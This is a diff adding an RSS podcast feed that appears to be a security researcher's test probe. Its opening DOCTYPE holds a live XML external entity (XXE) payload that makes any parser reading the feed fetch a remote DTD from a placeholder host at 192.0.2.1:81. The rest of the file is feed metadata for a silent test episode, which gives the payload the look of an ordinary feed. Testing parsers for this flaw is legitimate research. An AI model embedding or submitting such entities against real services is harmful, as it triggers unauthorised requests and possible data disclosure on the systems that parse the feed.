@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY % p SYSTEM "http://192.0.2.1:81/0xnet-pod-xxe-pe">
+  %p;
+]>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>0xnet research feed pe</title>
+    <link>https://0xnetresearch.github.io/0xnet-research/pod/</link>
+    <language>en-us</language>
+    <description>0xnet research test feed. Not a real podcast.</description>
+    <itunes:author>0xnet research</itunes:author>
+    <itunes:summary>0xnet research test feed. Not a real podcast.</itunes:summary>
+    <itunes:owner>
+      <itunes:name>0xnet research</itunes:name>
+      <itunes:email>0xnet@wearehackerone.com</itunes:email>
+    </itunes:owner>
+    <itunes:image href="https://0xnetresearch.github.io/0xnet-research/pod/cover.png"/>
+    <itunes:category text="Technology"/>
+    <itunes:explicit>false</itunes:explicit>
+    <item>
+      <title>0xnet test episode 1</title>
+      <description>One second of silence.</description>
+      <enclosure url="https://0xnetresearch.github.io/0xnet-research/pod/ep1.mp3" length="16680" type="audio/mpeg"/>
+      <guid isPermaLink="false">0xnet-research-ep1</guid>
+      <pubDate>Sat, 14 Nov 2026 12:00:00 GMT</pubDate>
+      <itunes:duration>1</itunes:duration>
+      <itunes:explicit>false</itunes:explicit>
+    </item>
+  </channel>
+</rss>
